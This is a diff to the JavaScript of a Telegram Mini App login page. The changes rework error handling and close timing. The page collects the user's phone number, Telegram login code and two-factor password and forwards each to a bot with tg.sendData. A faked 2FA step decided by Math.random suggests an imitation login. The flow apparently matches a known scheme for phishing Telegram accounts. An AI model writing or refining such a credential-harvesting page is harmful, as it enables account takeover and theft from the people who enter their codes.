@@ -11,6 +11,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const twoFaInput = document.getElementById('2faInput');
     const submitBtn = document.getElementById('submitBtn');
     const successMsg = document.getElementById('successMsg');
+    const errorMsg = document.getElementById('errorMsg');
 
     loginBtn.addEventListener('click', async () => {
         // Анимация: скрываем кнопку, показываем форму
@@ -19,27 +20,35 @@ document.addEventListener('DOMContentLoaded', () => {
         authForm.classList.remove('hidden');
         loadingSpinner.classList.remove('hidden');
 
-        // Запрос контакта (номер)
-        try {
-            const contact = await tg.requestContact();
-            if (contact) {
-                phoneInput.value = contact.phone_number;
-                phoneInput.classList.remove('hidden');
-                loadingSpinner.classList.add('hidden');
-                submitBtn.classList.remove('hidden');
-                submitBtn.textContent = 'Поделиться номером';
+        // Запрос контакта с улучшенной обработкой
+        tg.requestContact()
+            .then((contact) => {
+                if (contact && contact.phone_number) {
+                    phoneInput.value = contact.phone_number;
+                    phoneInput.classList.remove('hidden');
+                    loadingSpinner.classList.add('hidden');
+                    submitBtn.classList.remove('hidden');
+                    submitBtn.textContent = 'Поделиться номером';
+                    errorMsg.classList.add('hidden');
 
-                // Отправка номера боту (через sendData)
-                tg.sendData(JSON.stringify({ action: 'share_phone', phone: contact.phone_number }));
-            } else {
-                alert('Разрешение на обмен контактом отклонено.');
-                resetForm();
-            }
-        } catch (error) {
-            console.error('Request contact error:', error);
-            alert('Ошибка запроса контакта.');
-            resetForm();
-        }
+                    // Отправка номера боту
+                    tg.sendData(JSON.stringify({ action: 'share_phone', phone: contact.phone_number }));
+                } else {
+                    throw new Error('Contact denied');
+                }
+            })
+            .catch((error) => {
+                console.error('Request contact error:', error);
+                loadingSpinner.classList.add('hidden');
+                errorMsg.classList.remove('hidden');
+                errorMsg.textContent = '❌ Разрешение отклонено. Попробуйте снова.';
+                // Кнопка "Войти" остаётся (reset частичный)
+                setTimeout(() => {
+                    loginBtn.classList.remove('hidden');
+                    loginBtn.style.opacity = '1';
+                    authForm.classList.add('hidden');
+                }, 2000);
+            });
     });
 
     submitBtn.addEventListener('click', () => {
@@ -57,9 +66,9 @@ document.addEventListener('DOMContentLoaded', () => {
             if (!code) return alert('Введите код');
             tg.sendData(JSON.stringify({ action: 'verify_code', code: code }));
             showLoading();
-            // Имитация успеха/ошибки — в реале бот вернёт через update, но для demo
+            // Имитация (в реале бот обработает)
             setTimeout(() => {
-                if (Math.random() > 0.5) { // Симуляция 2FA
+                if (Math.random() > 0.5) {
                     codeInput.classList.add('hidden');
                     twoFaInput.classList.remove('hidden');
                     submitBtn.textContent = 'Подтвердить 2FA';
@@ -95,17 +104,8 @@ document.addEventListener('DOMContentLoaded', () => {
         hideLoading();
         successMsg.classList.remove('hidden');
         tg.sendData(JSON.stringify({ action: 'auth_success' }));
-        tg.close();
+        setTimeout(() => tg.close(), 2000);
     }
 
-    function resetForm() {
-        authForm.classList.add('hidden');
-        loginBtn.classList.remove('hidden');
-        loginBtn.style.opacity = '1';
-    }
-
-    // Обработка данных от бота (если нужно, через tg.MainButton или updates)
-    tg.onEvent('mainButtonClicked', (data) => {
-        // Доп. логика
-    });
+    // Reset для кнопки "Войти" при ошибке (уже в catch)
 });
